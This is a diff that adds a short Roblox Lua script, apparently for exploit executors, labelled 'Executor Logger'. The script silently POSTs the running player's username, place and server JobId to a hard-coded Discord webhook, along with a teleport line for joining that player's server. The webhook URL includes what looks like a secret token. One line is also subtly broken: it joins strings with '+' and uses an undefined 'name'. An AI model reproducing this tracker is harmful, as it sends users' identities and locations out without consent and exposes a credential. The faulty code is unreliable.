@@ -1,0 +1,6 @@
+local WebhookURL="https://discord.com/api/webhooks/1363202675117658457/-y3KrOs6KTv7UwlAgO7yVYeCEXIRszNPIzSw2kNWNgJCJkdYkVidrgtb6kvWj0PL_e3T"
+local HttpService,Players,MS=game:GetService("HttpService"),game:GetService("Players"),game:GetService("MarketplaceService")
+local PlaceId,JobId,PlaceName=game.PlaceId,game.JobId,"🌦️"..MS:GetProductInfo(game.PlaceId).Name
+local Data={content="",embeds={{title="🌟 New Execution! - " + name,description=("**Username:** %s\n**Place:** %s | %d\n```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```"):format(Players.LocalPlayer.Name,PlaceName,PlaceId,PlaceId,JobId),color=0x3498DB,footer={text="Executor Logger 🛰️"}}}}
+local req=request or http_request or syn.request
+req({Url=WebhookURL,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(Data)})
